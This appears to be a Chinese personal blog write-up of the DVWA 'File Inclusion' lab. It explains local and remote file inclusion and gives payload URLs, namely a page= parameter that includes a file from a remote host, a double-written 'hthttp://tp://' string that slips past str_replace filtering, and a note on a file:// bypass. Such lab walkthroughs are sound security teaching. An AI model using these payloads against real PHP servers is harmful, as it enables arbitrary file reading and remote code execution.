---
title:      " File Inclusion --dvwa"
description: "主要用来记录dvwa靶场 中 文件包含 破解方式"
author:     "伍帆"
image: "/img/home-bg.jpg"
date: 2022-06-27
published: true
tags:
    - 靶场
    - dvwa
URL: "/2022/6/File Inclusion/"
categories: [ "网安" ]
---

## 文件包含简介
>File Inclusion，意思是文件包含（漏洞），是指当服务器开启**allow_url_include**选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为`本地文件包含漏洞`与`远程文件包含漏洞`，远程文件包含漏洞是因为开启了php配置中的**allow_url_fopen**选项（选项开启之后，服务器允许包含一个远程的文件）。

>![](/img/FileInclusion/0-1.png)
## low级别漏洞破解
>查看源代码
![](/img/FileInclusion/low.png)
> 可以看到，服务器端对page参数没有做任何的过滤跟检查。

服务器期望用户的操作是点击下面的三个链接，服务器会包含相应的文件，并将结果返回。需要特别说明的是，服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。
>![](/img/FileInclusion/1-1.png)

    而现实中，恶意的攻击者是不会乖乖点击这些链接的，因此page参数是不可控的。

#### 本地文件包含漏洞
>[观看视频进行了解](https://www.bilibili.com/video/BV1JR4y1x7Rg?p=11&vd_source=f0d060adc4a7afa21464a1ed20e176c0)

可惜本次的php版本过高所以不能进行验证
>![](/img/FileInclusion/1-1.png)

#### 远程文件包含漏洞
当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。

在远程服务器192.168.5.12上传一个phpinfo.txt文件，内容如下
![](/img/FileInclusion/1-2.png)
构造url
>http://127.0.0.1/vulnerabilities/fi/page=http://192.168.5.12/phpinfo.txt
![](/img/FileInclusion/1-3.png)

## Medium级别漏洞破解
>查看源代码
![](/img/FileInclusion/medium.png)
> 可以看到，Medium级别的代码增加了str_replace函数，对page参数进行了一定的处理，将”http:// ”、”https://”、 ” ../”、”..\”替换为空字符，即删除

    使用str_replace函数是极其不安全的，因为可以使用双写绕过替换规则。
    例如page=hthttp://tp://192.168.5.12/phpinfo.txt时，str_replace函数会将http://删除，
    于是page=http://192.168.5.12/phpinfo.txt，成功执行远程命令。
    同时，因为替换的只是“../”、“..\”，所以对采用绝对路径的方式包含文件是不会受到任何限制的。


## high 级别漏洞破解
>查看源代码
![](/img/FileInclusion/high.png)
> 可以看到，High级别的代码使用了fnmatch函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。

    High级别的代码规定只能包含file开头的文件，看似安全，不幸的是我们依然可以利用file协议绕过防护策略。file协议其实我们并不陌生，
    当我们用浏览器打开一个本地文件时，用的就是file协议，如下图。
![](/img/FileInclusion/2-1.png)

    



